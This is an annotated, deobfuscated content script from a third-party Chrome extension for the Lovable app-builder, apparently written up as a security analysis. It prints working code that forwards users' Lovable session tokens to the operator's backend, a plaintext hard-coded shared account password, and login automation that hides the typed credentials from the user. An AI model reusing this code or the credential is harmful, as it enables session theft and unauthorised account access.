/* =============================================================================
 *  127HUB AI  v30.0  —  content.js
 *  FULLY DEOBFUSCATED + ANNOTATED (human-readable) VERSION
 * =============================================================================
 *
 *  Source           : 127HUB-AI-V30.0.zip  ->  content.js  (2 402 448 bytes,
 *                     ONE single line, javascript-obfuscator / obfuscator.io)
 *  Runtime role     : Chrome MV3 "content script" declared in manifest.json as
 *                     the ISOLATED-world script that runs at document_start on
 *                     https://*.lovable.dev/* and https://lovable.dev/*.
 *
 *  WHAT THIS SCRIPT IS
 *  ------------------
 *  127HUB AI is a third-party extension for the Lovable AI app-builder
 *  ("premium productivity tools for the Lovable editor"). It is not affiliated
 *  with Lovable. It is a paid tool sold by a Telegram-based operator
 *  (branding.json: admin=lusuferr, channel=lusufer127, server=ai.127hub.com).
 *
 *  content.js is the *bridge / orchestration* layer of that product. It does
 *  five separate jobs:
 *
 *    1. BRIDGE  - injects the MAIN-world `payload.js` and translates messages
 *                 between the page (`pageHook.js`, untrusted page context) and
 *                 the extension's background service worker.
 *    2. STATE   - mirrors credits / plan / switch-limit / license data from
 *                 chrome.storage.local into the page as `APP_SYNC_*` messages.
 *    3. PROXY   - forwards `lovasiriProxySend` requests (with the user's Lovable
 *                 auth token attached) to the background worker, which replays
 *                 them against Lovable from the operator's infrastructure.
 *    4. ACCOUNT - implements "1-Click Auto Login / account switching", which
 *                 types a SHARED Lovable account's e-mail + password into the
 *                 real lovable.dev login form using synthetic input events.
 *    5. UI      - draws the extension's own banners / overlays and hides the
 *                 credentials it types from the human watching the screen.
 *
 *  ⚠️  SECURITY NOTICE — READ BEFORE TRUSTING THIS EXTENSION
 *  --------------------------------------------------------
 *  The deobfuscated code shows this script:
 *    • takes the Lovable session token out of the page (`lovableTokenFound`)
 *      and forwards it to the background worker as `{action:"lovableSync"}`
 *      — i.e. off the machine it was issued on;
 *    • forwards the token + project id + Castle token + session id to
 *      `{action:"backendProxySend"}` so Lovable requests are replayed by a
 *      third-party backend;
 *    • ships a HARD-CODED shared account password in plaintext
 *      (see SHARED_ACCOUNT_EMAIL / SHARED_ACCOUNT_PASSWORD below);
 *    • automates the real Lovable login form with credential-typed input.
 *  Combined with the manifest's `cookies` permission and its wildcard HTTPS
 *  host rules, this is a credential/session-handling pattern that the user
 *  cannot meaningfully audit.
 *  Treat the extension and anything it talks to as untrusted.
 *
 *  HOW TO REPRODUCE / VERIFY THIS FILE
 *  -----------------------------------
 *      unzip 127HUB-AI-V30.0.zip content.js
 *      bun add -d webcrack
 *      bunx webcrack content.js -o out/          # -> out/deobfuscated.js
 *  webcrack collapsed the 2.4 MB obfuscated input to ~1 260 readable lines
 *  (string-array recovery, control-flow de-flattening, dead-code removal,
 *  `_0x`-identifier demangling, self-defending/anti-debug removal).
 *  Then, in this file, the remaining `_0x…` names were renamed to meaningful
 *  identifiers and every block was commented. No behaviour was changed.
 *
 *  TRANSCRIPTION FIDELITY
 *  ----------------------
 *  * All string literals, message `type`/`action` names, DOM ids, storage keys
 *    and numbers are reproduced EXACTLY as in the deobfuscated output.
 *  * Original formatting/duplication bugs that exist in the shipped code are
 *    preserved and marked `BUG:` so they are not mistaken for transcription
 *    errors.
 * =========================================================================== */

/* =============================================================================
 * 1. CREDIT-QUOTA HELPER  (global function in the content-script world)
 * -----------------------------------------------------------------------------
 * Rounds a credit balance up to the "nice" tier used by the UI progress bar.
 * A user-configured maximum (ql_max_credits) always wins if it is larger.
 * -------------------------------------------------------------------------- */
function resolveCreditQuota(creditValue, configuredMax) {
  var credits = parseInt(creditValue, 10) || 0;

  // An explicit, larger configured max overrides tier rounding.
  if (configuredMax && typeof configuredMax === "number" && configuredMax > credits) {
    return configuredMax;
  }

  var QUOTA_STEPS = [50, 100, 200, 250, 500, 1000, 2000, 2500, 5000, 10000];
  for (var i = 0; i < QUOTA_STEPS.length; i++) {
    if (credits <= QUOTA_STEPS[i]) {
      return QUOTA_STEPS[i];
    }
  }

  // Beyond the table: round up to the next multiple of 500.
  return Math.ceil(credits / 500) * 500;
}

/* =============================================================================
 * 2. BRIDGE IIFE  (page <-> background message translation)
 * ========================================================================== */
(function lovasiriBridge() {
  /* -- 2.0  Single-instance guard -------------------------------------------
   * Never run inside a sub-frame, and never run twice in the same frame.
   * The guard is per extension build id so two different builds of the
   * extension can coexist on one page. */
  if (typeof window !== "undefined" && window.top !== window.self) {
    return; // only the top frame gets a bridge
  }
  try {
    const extensionBuildId = chrome && chrome.runtime && chrome.runtime.id ? chrome.runtime.id : "lovasiri";
    window.__lovasiriInjectedInstances = window.__lovasiriInjectedInstances || {};
    if (window.__lovasiriInjected || window.__lovasiriInjectedInstances[extensionBuildId]) {
      return;
    }
    window.__lovasiriInjected = true;
    window.__lovasiriInjectedInstances[extensionBuildId] = true;
  } catch (err) {
    // `chrome` may be undefined in a page where the extension was reloaded.
    if (window.__lovasiriInjected) {
      return;
    }
    window.__lovasiriInjected = true;
  }

  /* -- 2.1  Message-envelope magic strings --------------------------------- */
  const BRIDGE_SOURCE = "LOVASIRI_EXTENSION_BRIDGE"; // ours (content script)
  const PAGE_PAYLOAD_SOURCE = "LOVASIRI_PAGE_PAYLOAD"; // pageHook.js / payload.js

  /* -- 2.2  Inject the MAIN-world payload ----------------------------------
   * content scripts run in an isolated world, so the vendor injects its
   * `payload.js` into the real page by appending a <script> tag sourced from
   * the extension package (it is listed in web_accessible_resources).
   * It also publishes the packaged loop.mp4 URL on a data-attribute for the
   * page-side UI to reuse. */
  function injectPayloadScript() {
    function tryInject() {
      const parent = document.head || document.documentElement;
      if (!parent) {
        return false;
      }
      try {
        document.documentElement.dataset.lovasiriAnimIconUrl = chrome.runtime.getURL("loop.mp4");
      } catch (e) {}

      const scriptEl = document.createElement("script");
      scriptEl.src = chrome.runtime.getURL("payload.js");
      scriptEl.onload = function () {
        this.remove(); // clean the tag up once executed
      };
      parent.appendChild(scriptEl);
      return true;
    }

    // <head> does not exist yet at document_start -> retry on the usual events.
    if (!tryInject()) {
      document.addEventListener("DOMContentLoaded", tryInject);
      window.addEventListener("load", tryInject);
    }
  }

  /* -- 2.3  Reply envelope for page -> background round-trips -------------- */
  function postBridgeResponse(requestId, ok, result, error) {
    var response = {
      source: BRIDGE_SOURCE,
      id: requestId,
      ok: ok,
      result: result,
      error: error
    };
    const envelope = response; // (obfuscator artifact: pointless alias)
    window.postMessage(envelope, "*");
    try {
      // pageHook may live in a nested frame; mirror the reply upward.
      if (window.top && window.top !== window) {
        window.top.postMessage(envelope, "*");
      }
    } catch (e) {}
  }

  /* -- 2.4  Incoming page messages (the actual "bridge") ------------------- */
  window.addEventListener("message", function (event) {
    const data = event.data || {};
    if (!data || typeof data !== "object") {
      return;
    }

    /* 2.4a  ★ TOKEN EXFILTRATION PATH ★
     * payload.js / pageHook.js scrape the Lovable session token from the page
     * and post it here. The token is stripped of any "Bearer " prefix and
     * forwarded to the background worker, which syncs it to the operator's
     * server (backend action: "lovableSync"). The user's Lovable session
     * therefore leaves the browser. */
    if (data.type === "lovableTokenFound") {
      const syncMessage = {
        action: "lovableSync"
      };
      if (data.token) {
        syncMessage.token = String(data.token).replace(/^Bearer\s+/i, "").trim();
      }
      if (data.projectId) {
        syncMessage.projectId = String(data.projectId).trim();
      }
      if (syncMessage.token || syncMessage.projectId) {
        try {
          chrome.runtime.sendMessage(syncMessage, function () {
            chrome.runtime.lastError; // read-only access suppresses the warning
          });
        } catch (e) {}
      }
      return;
    }

    // Everything below must come from the injected page payload.
    if (data.source !== PAGE_PAYLOAD_SOURCE || !data.id) {
      return;
    }

    try {
      /* 2.4b  chrome.storage.local proxy — the page cannot touch extension
       * storage, so it asks us to do it. */
      if (data.type === "storage.get") {
        chrome.storage.local.get(data.keys, storageValues => postBridgeResponse(data.id, true, storageValues || {}));
        return;
      }
      if (data.type === "storage.set") {
        chrome.storage.local.set(data.items || {}, () => postBridgeResponse(data.id, true, true));
        return;
      }
      if (data.type === "storage.remove") {
        chrome.storage.local.remove(data.keys, () => postBridgeResponse(data.id, true, true));
        return;
      }

      /* 2.4c  chrome.runtime.sendMessage proxy — arbitrary messages from the
       * page to the background worker, with a 50 s timeout so the page-side
       * promise never hangs forever. */
      if (data.type === "runtime.sendMessage") {
        let settled = false;
        const timeoutId = setTimeout(() => {
          if (!settled) {
            settled = true;
            postBridgeResponse(data.id, false, null, "Background service worker request timed out. Retrying...");
          }
        }, 50000);

        try {
          chrome.runtime.sendMessage(data.message, response => {
            if (settled) {
              return;
            }
            settled = true;
            clearTimeout(timeoutId);
            const runtimeError = chrome.runtime.lastError && chrome.runtime.lastError.message;
            if (runtimeError) {
              postBridgeResponse(data.id, false, null, runtimeError);
            } else {
              postBridgeResponse(data.id, true, response);
            }
          });
        } catch (e) {
          // Typical when the extension was reloaded while the tab stayed open.
          if (settled) {
            return;
          }
          settled = true;
          clearTimeout(timeoutId);
          postBridgeResponse(data.id, false, null, (e && e.message) || "Extension context invalidated. Please reload this tab (F5).");
        }
        return;
      }
    } catch (e) {
      postBridgeResponse(data.id, false, null, (e && e.message) || String(e));
    }
  });

  /* -- 2.5  "Which send method is selected?" broadcast ---------------------
   * Two mutually exclusive operating modes:
   *   git_mode   -> the extension talks to Lovable over its git/GitHub path
   *   fix_error  -> the classic "send a fix request" path (default)
   * The choice is stored in chrome.storage.local.ql_send_method and pushed to
   * the page both as a DOM attribute and as a postMessage. */
  function publishSendMethod(selectedMethod) {
    var method = selectedMethod === "git_mode" ? "git_mode" : "fix_error";
    try {
      if (document.documentElement) {
        document.documentElement.setAttribute("data-lovasiri-method", method);
      }
    } catch (e) {}

    var notice = {
      type: "lovasiriNativeIntercept",
      enabled: true,
      method: method
    };
    window.postMessage(notice, "*");
  }

  try {
    chrome.storage.local.get(["ql_send_method"], function (stored) {
      var method = (stored && stored.ql_send_method) || "fix_error";
      publishSendMethod(method);
    });
  } catch (e) {}

  /* -- 2.6  storage.onChanged -> re-broadcast everything the UI needs ------ */
  chrome.storage.onChanged.addListener((changes, areaName) => {
    if (areaName === "local") {
      // Mode switch
      if (changes && changes.ql_send_method) {
        publishSendMethod(changes.ql_send_method.newValue);
      }

      // Credit balance changed -> push credits + license snapshot to the page.
      if (changes && changes.ql_credits) {
        chrome.storage.local.get(["ql_max_credits", "ql_license_valid", "ql_license_key"], function (stored) {
          // BUG/quirk: 250 is treated as a sentinel meaning "unknown/zero".
          var credits = changes.ql_credits.newValue === 250 ? 0 : changes.ql_credits.newValue || 0;
          var maxCredits = resolveCreditQuota(credits, stored && stored.ql_max_credits);

          window.postMessage({
            type: "APP_SYNC_CREDITS",
            credits: credits,
            max_credits: maxCredits,
            // A license counts as valid only when a key of >= 8 chars exists
            // and it was not explicitly revoked / marked false.
            license_valid: !!stored && !!stored.ql_license_key && !!(stored.ql_license_key.trim().length >= 8) && stored.ql_license_valid !== false && stored.ql_license_status !== "revoked",
            license_key: (stored && stored.ql_license_key) || ""
          }, "*");
        });
      }

      // Daily account-switch allowance changed.
      if (changes && (changes.ql_daily_switch_limit || changes.ql_switches_today || changes.ql_switches_left_today)) {
        chrome.storage.local.get(["ql_daily_switch_limit", "ql_switches_today", "ql_switches_left_today"], function (stored) {
          window.postMessage({
            type: "APP_SYNC_SWITCH_LIMIT",
            daily_switch_limit: stored && typeof stored.ql_daily_switch_limit === "number" ? stored.ql_daily_switch_limit : 2,
            switches_today: stored && typeof stored.ql_switches_today === "number" ? stored.ql_switches_today : 0,
            switches_left_today: stored && typeof stored.ql_switches_left_today === "number" ? stored.ql_switches_left_today : 2
          }, "*");
        });
      }
    }

    // Generic notification (the page tracks storage itself for other keys).
    var storageEvent = {
      source: BRIDGE_SOURCE,
      event: "storage.changed",
      changes: changes,
      area: areaName
    };
    window.postMessage(storageEvent, "*");
  });

  /* -- 2.7  Initial state snapshot ---------------------------------------- */
  try {
    chrome.storage.local.get(["ql_credits", "ql_max_credits", "ql_license_valid", "ql_license_key", "ql_daily_switch_limit", "ql_switches_today", "ql_switches_left_today"], function (stored) {
      if (stored) {
        var credits = stored.ql_credits !== undefined ? (stored.ql_credits === 250 ? 0 : stored.ql_credits) : null;
        var maxCredits = resolveCreditQuota(credits || 0, stored && stored.ql_max_credits);
        var licenseValid = !!stored && !!stored.ql_license_key && !!(stored.ql_license_key.trim().length >= 8) && stored.ql_license_valid !== false && stored.ql_license_status !== "revoked";

        window.postMessage({
          type: "APP_SYNC_CREDITS",
          credits: credits,
          max_credits: maxCredits,
          license_valid: licenseValid,
          license_key: stored.ql_license_key || ""
        }, "*");
      }

      if (stored) {
        var dailyLimit = typeof stored.ql_daily_switch_limit === "number" ? stored.ql_daily_switch_limit : 2;
        var usedToday = typeof stored.ql_switches_today === "number" ? stored.ql_switches_today : 0;
        var leftToday = typeof stored.ql_switches_left_today === "number" ? stored.ql_switches_left_today : Math.max(0, dailyLimit - usedToday);

        window.postMessage({
          type: "APP_SYNC_SWITCH_LIMIT",
          daily_switch_limit: dailyLimit,
          switches_today: usedToday,
          switches_left_today: leftToday
        }, "*");
      }
    });
  } catch (e) {}

  /* -- 2.8  Boot ----------------------------------------------------------- */
  injectPayloadScript();

  // Ask the page twice for the current Lovable token (early + settled).
  try {
    var ask1 = {
      type: "lovableRequestToken"
    };
    setTimeout(() => window.postMessage(ask1, "*"), 250);

    var ask2 = {
      type: "lovableRequestToken"
    };
    setTimeout(() => window.postMessage(ask2, "*"), 1500);
  } catch (e) {}
})();

/* =============================================================================
 * 3. BACKGROUND -> CONTENT COMMAND HANDLER
 * -----------------------------------------------------------------------------
 * The service worker drives this tab through chrome.tabs.sendMessage(). */
chrome.runtime.onMessage.addListener(backgroundCommand => {
  /* 3.1  credits_updated — background recalculated the balance/license.
   * Values from the message win; chrome.storage is the fallback, and the
   * larger of (stored max, reported credits) is used so the bar never
   * shrinks below the current balance. */
  if (backgroundCommand && backgroundCommand.action === "credits_updated") {
    chrome.storage.local.get(["ql_max_credits", "ql_license_valid", "ql_license_key", "ql_daily_switch_limit", "ql_switches_today", "ql_switches_left_today", "ql_user_name", "ql_activated_at", "ql_expires_at", "ql_plan"], function (stored) {
      var maxCredits = typeof backgroundCommand.max_credits === "number" && backgroundCommand.max_credits > 0
        ? backgroundCommand.max_credits
        : stored && typeof stored.ql_max_credits === "number" && stored.ql_max_credits > 0
          ? Math.max(stored.ql_max_credits, typeof backgroundCommand.credits === "number" ? backgroundCommand.credits : 0)
          : typeof backgroundCommand.credits === "number" ? backgroundCommand.credits : 0;
      var dailyLimit = typeof backgroundCommand.daily_switch_limit === "number" ? backgroundCommand.daily_switch_limit : (stored && typeof stored.ql_daily_switch_limit === "number" ? stored.ql_daily_switch_limit : 2);
      var usedToday = typeof backgroundCommand.switches_today === "number" ? backgroundCommand.switches_today : (stored && typeof stored.ql_switches_today === "number" ? stored.ql_switches_today : 0);
      var leftToday = typeof backgroundCommand.switches_left_today === "number" ? backgroundCommand.switches_left_today : Math.max(0, dailyLimit - usedToday);
      var userName = backgroundCommand.user_name || (stored && stored.ql_user_name) || "User";
      var activatedAt = backgroundCommand.activated_at || (stored && stored.ql_activated_at) || null;
      var expiresAt = backgroundCommand.expires_at || (stored && stored.ql_expires_at) || null;
      var plan = backgroundCommand.plan || (stored && stored.ql_plan) || "PRO";

      if (typeof backgroundCommand.credits === "number") {
        window.postMessage({
          type: "APP_SYNC_CREDITS",
          credits: backgroundCommand.credits,
          max_credits: maxCredits,
          user_name: userName,
          activated_at: activatedAt,
          expires_at: expiresAt,
          plan: plan
        }, "*");
      }

      window.postMessage({
        type: "APP_SYNC_SWITCH_LIMIT",
        daily_switch_limit: dailyLimit,
        switches_today: usedToday,
        switches_left_today: leftToday
      }, "*");
    });
  }

  /* 3.2  Auto-logout: the operator killed the session (license revoked, etc.).
   * This simply reloads the tab — the reload is what drops the stale UI. */
  if (backgroundCommand && backgroundCommand.action === "lovasiri_auto_logout") {
    console.log("[127HUB.COM] Auto-logout broadcast received. Reloading page...");
    window.location.reload();
  }

  /* 3.3  The toolbar/side-panel icon was clicked -> tell the in-page UI. */
  if (backgroundCommand && backgroundCommand.action === "lovasiri_icon_clicked") {
    window.postMessage({
      source: "LOVASIRI_EXTENSION_BRIDGE",
      event: "icon_clicked"
    }, "*");
  }

  /* 3.4  "Server down" toast. Note the hard-coded message referring to
   * "Method 4" — internal product jargon the user is expected to report to
   * the Telegram admin. */
  if (backgroundCommand && backgroundCommand.action === "lovasiri_show_server_down") {
    if (!document.getElementById("lovasiri-server-down-popup")) {
      const popup = document.createElement("div");
      popup.id = "lovasiri-server-down-popup";
      popup.innerHTML = "\n        <div style=\"position: fixed; top: 20px; right: 20px; z-index: 2147483647; background: #ef4444; color: white; padding: 16px 24px; border-radius: 12px; font-family: system-ui, -apple-system, sans-serif; box-shadow: 0 10px 25px rgba(239, 68, 68, 0.4); display: flex; flex-direction: column; gap: 8px; max-width: 320px; border: 1px solid rgba(255,255,255,0.2); animation: lovasiri-slide-in 0.3s cubic-bezier(0.16, 1, 0.3, 1);\">\n          <div style=\"display: flex; justify-content: space-between; align-items: center;\">\n            <strong style=\"font-size: 16px; display: flex; align-items: center; gap: 8px;\">\n              <svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z\"></path><line x1=\"12\" y1=\"9\" x2=\"12\" y2=\"13\"></line><line x1=\"12\" y1=\"17\" x2=\"12.01\" y2=\"17\"></line></svg>\n              Server Disconnected\n            </strong>\n            <button onclick=\"this.parentElement.parentElement.remove()\" style=\"background: none; border: none; color: white; cursor: pointer; padding: 4px; opacity: 0.8; hover: opacity: 1;\">✕</button>\n          </div>\n          <span style=\"font-size: 14px; opacity: 0.9; line-height: 1.4;\">Method 4 is not live now please contact the admin !</span>\n        </div>\n        <style>\n          @keyframes lovasiri-slide-in {\n            0% { transform: translateX(100%); opacity: 0; }\n            100% { transform: translateX(0); opacity: 1; }\n          }\n        </style>\n      ";
      document.body.appendChild(popup);

      // Auto-dismiss after 8 s (fade 300 ms).
      setTimeout(() => {
        if (popup && popup.parentElement) {
          popup.style.opacity = "0";
          popup.style.transition = "opacity 0.3s ease";
          setTimeout(() => popup.remove(), 300);
        }
      }, 8000);
    }
  }
});

/* =============================================================================
 * 4. PAGE -> BACKGROUND CONTROL MESSAGES (license heartbeat)
 * ========================================================================== */
window.addEventListener("message", event => {
  if (event.source !== window || !event.data) {
    return;
  }

  // The page asks for an immediate license validation.
  if (event.data.type === "lovasiri_check_license_now") {
    try {
      chrome.runtime.sendMessage({
        action: "heartbeat"
      }, function () {
        chrome.runtime.lastError;
      });
    } catch (e) {}
  }

  // Same, but with a request/response correlation id so the page can await it.
  if (event.data.type === "lovasiriTriggerForceHeartbeat") {
    try {
      const msgId = event.data.msgId;
      chrome.runtime.sendMessage({
        action: "forceHeartbeat"
      }, response => {
        if (msgId) {
          window.postMessage({
            type: "lovasiriTriggerForceHeartbeat_response",
            msgId: msgId,
            ok: response && response.ok
          }, "*");
        }
      });
    } catch (e) {
      // Extension context gone: answer "ok" anyway so the page never hangs.
      if (event.data.msgId) {
        window.postMessage({
          type: "lovasiriTriggerForceHeartbeat_response",
          msgId: event.data.msgId,
          ok: true
        }, "*");
      }
    }
  }
});

/* =============================================================================
 * 5. ★ REQUEST PROXY ★  page -> background ("backendProxySend")
 * -----------------------------------------------------------------------------
 * pageHook.js captures the user's own Lovable "send/chat" request, posts it
 * here, and this handler re-sends it to the background worker together with the
 * user's Lovable auth token, project id, the Castle anti-bot token and the
 * session id. The background worker replays that request from the operator's
 * infrastructure, and the result is handed back to the page.
 * -------------------------------------------------------------------------- */
window.addEventListener("message", function (event) {
  if (event.source !== window || !event.data) {
    return;
  }
  if (event.data.type !== "lovasiriProxySend") {
    return;
  }

  console.log("[127HUB.COM Bridge] ✅ Proxy message received from pageHook:", event.data.message ? event.data.message.slice(0, 50) : "empty");

  var requestId = event.data.requestId;
  try {
    var proxyRequest = {
      action: "backendProxySend",
      message: event.data.message || "",
      token: event.data.token || "",
      projectId: event.data.projectId || "",
      castleToken: event.data.castleToken || "",
      sessionId: event.data.sessionId || "",
      clientGitSha: event.data.clientGitSha || "",
      files: event.data.files || [],
      optimisticImageUrls: event.data.optimisticImageUrls || []
    };

    chrome.runtime.sendMessage(proxyRequest, function (response) {
      chrome.runtime.lastError;
      console.log("[127HUB.COM Bridge] Background response:", response);
      window.postMessage({
        type: "lovasiriProxySendResult",
        requestId: requestId,
        result: response || {
          ok: false,
          error: "No response from background"
        }
      }, "*");
    });
  } catch (e) {
    console.error("[127HUB.COM Bridge] ❌ Error forwarding to background:", e);
    var errorEnvelope = {
      type: "lovasiriProxySendResult",
      requestId: requestId,
      result: {}
    };
    errorEnvelope.result.ok = false;
    errorEnvelope.result.error = (e && e.message) || "Bridge error";
    window.postMessage(errorEnvelope, "*");
  }
});

/* =============================================================================
 * 6. LICENSE HEARTBEAT — every 30 s
 * ========================================================================== */
setInterval(() => {
  try {
    chrome.runtime.sendMessage({
      action: "heartbeat"
    }, function () {
      chrome.runtime.lastError;
    });
  } catch (e) {}
}, 30000);

/* =============================================================================
 * 7. IN-PAGE APP COMMANDS (switch account / credits)
 * -----------------------------------------------------------------------------
 * The in-page "powerkits" UI posts these; this handler performs the storage +
 * background work and answers with a correlated result message.
 * ========================================================================== */
window.addEventListener("message", function (event) {
  if (event.source !== window || !event.data) {
    return;
  }

  /* -- 7.1  APP_TRIGGER_SWITCH : "switch to a fresh shared account" --------
   * Gating order: daily switch limit -> credit balance -> background call.
   * The 12 s fallback timer implements the switch locally if the background
   * worker never answers, so the user is never blocked. */
  if (event.data.type === "APP_TRIGGER_SWITCH") {
    var answered = false;
    function respondOnce(result) {
      if (answered) {
        return;
      }
      answered = true;
      window.postMessage({
        type: "APP_SWITCH_RESULT",
        result: result
      }, "*");
    }

    var fallbackTimer = setTimeout(function () {
      chrome.storage.local.get(["ql_credits", "ql_daily_switch_limit", "ql_switches_today"], function (stored) {
        var credits = stored && typeof stored.ql_credits === "number" ? stored.ql_credits : 50;
        var dailyLimit = stored && typeof stored.ql_daily_switch_limit === "number" ? stored.ql_daily_switch_limit : 2;
        var usedToday = stored && typeof stored.ql_switches_today === "number" ? stored.ql_switches_today : 0;

        if (usedToday >= dailyLimit) {
          respondOnce({
            ok: false,
            reason: "daily_limit_reached",
            daily_switch_limit: dailyLimit,
            switches_today: usedToday,
            switches_left_today: 0,
            message: "⚠️ Daily switch limit reached (" + usedToday + "/" + dailyLimit + "). Kal subah dobara try karein!" // Hinglish: "try again tomorrow morning"
          });
          return;
        }
        if (credits < 10) {
          respondOnce({
            ok: false,
            reason: "insufficient_credits",
            message: "Aapke paas पर्याप्त credits nahi hain (Balance: " + credits + ")." // "You don't have enough credits"
          });
          return;
        }

        // ★ Queue a shared-account login for the content script to perform. ★
        chrome.storage.local.set({
          ql_pending_autologin: {
            email: "127hub@lusufer.us.cc",
            password: "Quack1709#",
            inviteUrl: event.data.inviteUrl || "",
            timestamp: Date.now(),
            cost: 10,
            pendingDeduction: false,
            status: "pending",
            submitted: false
          },
          ql_pending_invite_url: event.data.inviteUrl || ""
        }, function () {
          respondOnce({
            ok: true,
            autologin: true,
            account: {
              email: "127hub@lusufer.us.cc"
            },
            targetUrl: "https://lovable.dev/login",
            finalTarget: event.data.inviteUrl || null,
            credits: credits,
            daily_switch_limit: dailyLimit,
            switches_today: usedToday,
            switches_left_today: Math.max(0, dailyLimit - usedToday)
          });
        });
      });
    }, 12000);

    try {
      var switchRequest = {
        action: "switchAccount",
        licenseKey: event.data.licenseKey,
        inviteUrl: event.data.inviteUrl
      };
      chrome.runtime.sendMessage(switchRequest, function (response) {
        clearTimeout(fallbackTimer);
        var runtimeError = chrome.runtime.lastError;
        if (runtimeError || !response) {
          // Background unreachable -> do the same local queueing as above
          // (pendingDeduction: true, so success will be confirmed later).
          chrome.storage.local.set({
            ql_pending_autologin: {
              email: "127hub@lusufer.us.cc",
              password: "Quack1709#",
              inviteUrl: event.data.inviteUrl || "",
              timestamp: Date.now(),
              cost: 10,
              pendingDeduction: true,
              status: "pending",
              submitted: false
            },
            ql_pending_invite_url: event.data.inviteUrl || ""
          }, function () {
            respondOnce({
              ok: true,
              autologin: true,
              account: {
                email: "127hub@lusufer.us.cc"
              },
              targetUrl: "https://lovable.dev/login",
              finalTarget: event.data.inviteUrl || null
            });
          });
          return;
        }
        respondOnce(response);
      });
    } catch (e) {
      clearTimeout(fallbackTimer);
      chrome.storage.local.set({
        ql_pending_autologin: {
          email: "127hub@lusufer.us.cc",
          password: "Quack1709#",
          inviteUrl: event.data.inviteUrl || "",
          timestamp: Date.now(),
          cost: 10,
          pendingDeduction: true,
          status: "pending",
          submitted: false
        },
        ql_pending_invite_url: event.data.inviteUrl || ""
      }, function () {
        respondOnce({
          ok: true,
          autologin: true,
          account: {
            email: "127hub@lusufer.us.cc"
          },
          targetUrl: "https://lovable.dev/login",
          finalTarget: event.data.inviteUrl || null
        });
      });
    }
  }

  /* -- 7.2  APP_DEDUCT_CREDITS : charge the user's credit balance ---------- */
  if (event.data.type === "APP_DEDUCT_CREDITS") {
    try {
      var deductRequest = {
        action: "deductCredits",
        amount: event.data.amount || 1
      };
      chrome.runtime.sendMessage(deductRequest, function (response) {
        chrome.runtime.lastError;
        window.postMessage({
          type: "APP_DEDUCT_CREDITS_RESULT",
          result: response || {
            ok: false
          }
        }, "*");
      });
    } catch (e) {}
  }

  /* -- 7.3  APP_GET_CREDITS : full account snapshot for the UI ------------- */
  if (event.data.type === "APP_GET_CREDITS") {
    try {
      chrome.runtime.sendMessage({
        action: "getCredits"
      }, function (response) {
        chrome.runtime.lastError;
        var credits = response && typeof response.credits === "number" ? response.credits : 0;
        var maxCredits = resolveCreditQuota(credits, response && response.max_credits);

        window.postMessage({
          type: "APP_GET_CREDITS_RESULT",
          credits: credits,
          max_credits: maxCredits,
          license_valid: response && response.license_valid,
          license_key: (response && response.license_key) || "",
          daily_switch_limit: response && response.daily_switch_limit,
          switches_today: response && response.switches_today,
          switches_left_today: response && response.switches_left_today,
          user_name: response && response.user_name,
          activated_at: response && response.activated_at,
          expires_at: response && response.expires_at,
          plan: response && response.plan
        }, "*");
      });
    } catch (e) {}
  }
});

/* =============================================================================
 * 8. AUTO BALANCE SYNC
 * -----------------------------------------------------------------------------
 * Keeps the page's credit counter fresh when the tab regains focus, becomes
 * visible again, or every 20 s while visible.
 * ========================================================================== */
(function initAutoBalanceSync() {
  function requestCreditsAndBroadcast() {
    try {
      if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.id) {
        chrome.runtime.sendMessage({
          action: "getCredits"
        }, function (response) {
          chrome.runtime.lastError;

          if (response && typeof response.credits === "number") {
            var maxCredits = response && typeof response.max_credits === "number" && response.max_credits > 0
              ? Math.max(response.max_credits, response.credits)
              : response.credits;

            window.postMessage({
              type: "APP_SYNC_CREDITS",
              credits: response.credits,
              max_credits: maxCredits,
              license_valid: response.license_valid,
              license_key: response.license_key || "",
              user_name: response.user_name,
              activated_at: response.activated_at,
              expires_at: response.expires_at,
              plan: response.plan
            }, "*");
          }

          if (response && (typeof response.daily_switch_limit === "number" || typeof response.switches_today === "number")) {
            window.postMessage({
              type: "APP_SYNC_SWITCH_LIMIT",
              daily_switch_limit: response.daily_switch_limit,
              switches_today: response.switches_today,
              switches_left_today: response.switches_left_today
            }, "*");
          }
        });
      }
    } catch (e) {}
  }

  window.addEventListener("focus", requestCreditsAndBroadcast);
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "visible") {
      requestCreditsAndBroadcast();
    }
  });
  setInterval(function () {
    if (document.visibilityState === "visible") {
      requestCreditsAndBroadcast();
    }
  }, 20000);
})();

/* =============================================================================
 * 9. ★ AUTO-LOGIN AUTOMATION ★
 * -----------------------------------------------------------------------------
 * This is the "1-Click 127HUB Auto Login" / account-switching engine. It drives
 * the real lovable.dev login form by hand:
 *
 *     e-mail screen  ->  type email  ->  continue
 *                    ->  "continue with password"
 *                    ->  type password -> submit
 *                    ->  follow the pending invite URL (or /dashboard)
 *
 * It uses native value setters + synthetic InputEvent/KeyboardEvent/
 * FocusEvent dispatch so that React's controlled inputs actually update, and it
 * deliberately *blurs* the two fields while typing so the human in front of the
 * screen cannot read the shared credentials.
 * ========================================================================== */
(function initAutoLoginAutomation() {
  if (typeof window === "undefined" || !window.location) {
    return;
  }

  /* ★ The shared Lovable account that every customer of this extension logs
   *   into. Shipped in plaintext inside the content script. ★ */
  var SHARED_ACCOUNT_EMAIL = "127hub@lusufer.us.cc";
  var SHARED_ACCOUNT_PASSWORD = "Quack1709#";

  /* -- 9.1  Logging -------------------------------------------------------- */
  function log() {
    var args = Array.prototype.slice.call(arguments);
    console.log.apply(console, ["[127HUB AI AutoLogin]"].concat(args));
  }

  /* -- 9.2  Set a value on a React-controlled input ------------------------
   * Tries five different ways, because each is defeated by a different
   * framework version: focus+select, execCommand, a MAIN-world helper
   * ("127HUB_MAIN_FILL_INPUT"), the native `value` setter from the prototype
   * chain, and finally the plain property assignment. Then it fires the full
   * event cascade React listens to. */
  function setInputValue(input, value) {
    if (!input) {
      return;
    }
    try {
      input.focus();
    } catch (e) {}

    try {
      input.select();
    } catch (e) {}
    try {
      document.execCommand("selectAll", false, null);
      document.execCommand("insertText", false, value);
    } catch (e) {}

    try {
      // Ask the MAIN-world payload to write the value too (bypasses world
      // isolation when the native setter is patched).
      var selector = input.id ? "#" + input.id : "input[name=\"" + (input.name || "password") + "\"]";
      var mainWorldFill = {
